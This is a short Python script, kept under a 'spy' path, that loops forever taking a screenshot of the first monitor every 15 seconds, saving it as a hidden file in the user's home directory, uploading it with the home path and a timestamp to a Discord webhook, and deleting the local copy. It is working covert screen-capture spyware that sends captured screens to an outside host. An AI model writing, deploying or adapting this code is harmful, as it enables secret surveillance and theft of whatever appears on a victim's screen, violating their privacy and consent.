#!/usr/bin/env python

import time, os
from datetime import datetime

from mss import mss
from discord_webhook import DiscordWebhook, DiscordEmbed
from dotenv import load_dotenv

load_dotenv('/usr/local/src/spy/.env')

userhome = os.path.expanduser('~')
URL = os.getenv('DISCORD_WEBHOOK_URL')

def upload_file(filename):
    content = f'{userhome} - {datetime.now()}'
    webhook = DiscordWebhook(url=URL, content=content, rate_limit_retry=True)
    with open(filename, "rb") as f:
        webhook.add_file(file=f.read(), filename=filename)
    response = webhook.execute()



# The simplest use, save a screen shot of the 1st monitor
while True:
    try:
        print(datetime.now(), 'Taking screenshot...')
        with mss() as sct:
            filename=sct.shot(output=f'{userhome}/.shot.png')
            print(datetime.now(), 'Uploading file...')
            upload_file(filename)
            os.unlink(filename)
    except Exception as e:
        print(e)
    print('sleeping...')
    time.sleep(15)
        

